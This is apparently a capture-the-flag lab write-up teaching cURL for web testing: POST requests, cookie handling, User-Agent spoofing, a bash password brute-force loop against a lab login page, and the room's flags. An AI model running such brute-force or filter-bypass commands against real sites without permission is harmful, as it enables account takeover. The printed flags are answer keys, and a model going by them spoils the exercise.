# 🎄 TryHackMe Advent of Cyber 2025 - Day 24 🎄

## Exploitation with cURL - Hoperation Eggsploit: THE FINALE!

[![TryHackMe](https://img.shields.io/badge/TryHackMe-Advent%20of%20Cyber%202025-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com/room/adventofcyber2025)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)](https://tryhackme.com)
[![Duration](https://img.shields.io/badge/Duration-30%20minutes-blue?style=for-the-badge)](https://tryhackme.com)
[![Day](https://img.shields.io/badge/Day-24%20FINAL-gold?style=for-the-badge)](https://tryhackme.com)

---

## 📖 Story: The Final Mission

The wormhole is held open by the Evil Bunnies' web control panel. Before the final battle with King Malhare, the team must close it to cut off reinforcements.

The terminal is bare: **No Burp Suite. No browser. Just a command prompt.**

But that's all they need. Using **cURL**, they'll speak HTTP directly, exploit endpoints, and shut down the portal.

**Your Mission**: Master cURL for web exploitation and close the wormhole! 🌀🔓

---

## 🎯 Learning Objectives

- ✅ HTTP request/response fundamentals
- ✅ cURL for GET and POST requests
- ✅ Form data submission
- ✅ Cookie and session management
- ✅ Automated brute force attacks
- ✅ User-Agent spoofing and bypass
- ✅ Command-line web exploitation

---

## 🌐 HTTP & cURL Basics

### What is cURL?

**cURL** (Client URL) is a command-line tool for transferring data with URLs. For web exploitation, it's perfect for:
- Precise HTTP request control
- Automation and scripting
- Working without GUI tools
- Testing APIs and endpoints

### Basic GET Request

```bash
curl http://MACHINE_IP/
```

**Output**: Raw HTML response body

---

## 📤 POST Requests

### Basic Form Submission

```bash
curl -X POST -d "username=admin&password=admin" http://MACHINE_IP/post.php
```

**Flags:**
- `-X POST` → HTTP POST method
- `-d "data"` → Form data (URL-encoded)

### Include Response Headers

```bash
curl -i -X POST -d "username=admin&password=admin" http://MACHINE_IP/post.php
```

**`-i` flag** shows:
- Status code
- Headers (including Set-Cookie!)
- Response body

---

## 🍪 Session Management

### Save Cookies

```bash
curl -c cookies.txt -d "username=admin&password=admin" http://MACHINE_IP/session.php
```

**`-c cookies.txt`** saves server cookies to file

### Reuse Cookies

```bash
curl -b cookies.txt http://MACHINE_IP/session.php
```

**`-b cookies.txt`** sends saved cookies with request

**Use Case**: Maintain authenticated sessions across requests

---

## 🔓 Automated Brute Force

### Password List (passwords.txt)

```
admin123
password
letmein
secretpass
secret
```

### Brute Force Script (loop.sh)

```bash
#!/bin/bash

for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://MACHINE_IP/bruteforce.php)
  
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done
```

### Execute

```bash
chmod +x loop.sh
./loop.sh
```

**How It Works:**
1. Reads each password from file
2. Sends POST request with credentials
3. Checks response for success string
4. Exits when password found

**This is the foundation of Hydra, Burp Intruder, WFuzz!**

---

## 🕵️ User-Agent Spoofing

### Default Behavior (Blocked)

```bash
curl -i http://MACHINE_IP/ua_check.php
```

**May return**: `Access Denied`

### Bypass with Custom User-Agent

```bash
curl -A "TBFC" http://MACHINE_IP/ua_check.php
```

**`-A` flag** sets custom User-Agent header

### Verify Bypass

```bash
# Blocked
curl -i http://MACHINE_IP/ua_check.php

# Success
curl -i -A "TBFC" http://MACHINE_IP/ua_check.php
```

---

## 🚩 Challenge Solutions

### Q1: POST to /post.php

**Command:**
```bash
curl -X POST -d "username=admin&password=admin" http://MACHINE_IP/post.php
```

**Flag**: `THM{curl_post_success}`

---

### Q2: Cookie Management at /cookie.php

**Save Cookie:**
```bash
curl -c cookies.txt -X POST -d "username=admin&password=admin" http://MACHINE_IP/cookie.php
```

**Reuse Cookie:**
```bash
curl -b cookies.txt http://MACHINE_IP/cookie.php
```

**Flag**: `THM{session_cookie_master}`

---

### Q3: Brute Force /bruteforce.php

**Execute Script:**
```bash
./loop.sh
```

**Password Found**: `secretpass`

---

### Q4: User-Agent to /agent.php

**Command:**
```bash
curl -A "TBFC" http://MACHINE_IP/agent.php
```

**Flag**: `THM{user_agent_filter_bypassed}`

---

## 🔧 cURL Flags Cheat Sheet

| Flag | Purpose | Example |
|------|---------|---------|
| `-X METHOD` | Set HTTP method | `-X POST`, `-X PUT` |
| `-d "data"` | POST data | `-d "user=admin&pass=123"` |
| `-c file` | Save cookies | `-c cookies.txt` |
| `-b file` | Send cookies | `-b cookies.txt` |
| `-A "UA"` | Set User-Agent | `-A "Mozilla/5.0"` |
| `-i` | Include headers | `-i` |
| `-s` | Silent mode | `-s` |
| `-L` | Follow redirects | `-L` |
| `-H "header"` | Custom header | `-H "X-API-Key: abc"` |
| `-o file` | Output to file | `-o response.html` |
| `-v` | Verbose mode | `-v` |

---

## 🎓 Key Takeaways

1. **🌐 cURL = Direct HTTP Control**
   - No GUI needed
   - Full request customization
   - Scriptable and automatable

2. **📤 POST for Authentication**
   - `-X POST` + `-d "credentials"`
   - URL-encoded form data
   - Standard web authentication

3. **🍪 Manual Cookie Handling**
   - `-c` saves, `-b` sends
   - Required for sessions
   - Unlike browsers, manual management

4. **🔓 Brute Force Made Simple**
   - Loop through credentials
   - Check response patterns
   - Automated exploitation

5. **🕵️ Header Manipulation**
   - User-Agent checking common
   - `-A` flag for spoofing
   - Bypass basic filters

6. **⚡ Command-Line Advantage**
   - Faster than GUI tools
   - Works in restricted environments
   - Perfect for automation

---

## 🏆 The Epic Conclusion

With the wormhole closed using cURL exploitation, McSkidy led the final charge against King Malhare's forces. In an epic battle of snowballs vs eggs, she infiltrated the throne room.

Sir BreachBlocker III redeemed himself, blocking Sir CarrotBaine: *"What I should have done long ago. What's right!"*

McSkidy confronted the king: *"It's over. Wareville is ours."*

The townspeople captured King Malhare. He was dethroned and imprisoned at HopSec Prison with Sir CarrotBaine.

Sir BreachBlocker III became King BreachBlocker.

**Wareville was safe. SOC-mas was saved!** 🎄✨

---

## 📚 Additional Resources

### Tools & References
- [cURL Official Documentation](https://curl.se/docs/) - Complete reference
- [HTTP Status Codes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status) - Understanding responses
- [Burp Suite](https://portswigger.net/burp) - GUI alternative for web testing

### Related Rooms
- **Web Fundamentals** - HTTP basics
- **Burp Suite Basics** - GUI web testing
- **Hydra** - Advanced password attacks
- **Web Application Security** - Comprehensive testing

---

## 🎉 Congratulations!

**You've completed Advent of Cyber 2025!**

From all of us at TryHackMe:
🎅 **Merry SOC-Mas**  
🐰 **Hoppy New Year**  
🎄 **Keep Learning, Keep Hacking!**

---

<div align="center">

### 🎄 Command-Line is Power! 🎄

**Master cURL. Master the Web.**

Made with ❤️ for the offensive security community

![TryHackMe](https://tryhackme.com/img/logo/tryhackme_logo_full.svg)

</div>

---

**Tags**: `#TryHackMe` `#AdventOfCyber2025` `#cURL` `#WebExploitation` `#HTTP` `#BruteForce` `#OffensiveSecurity` `#CommandLine` `#WebHacking` `#RedTeam`
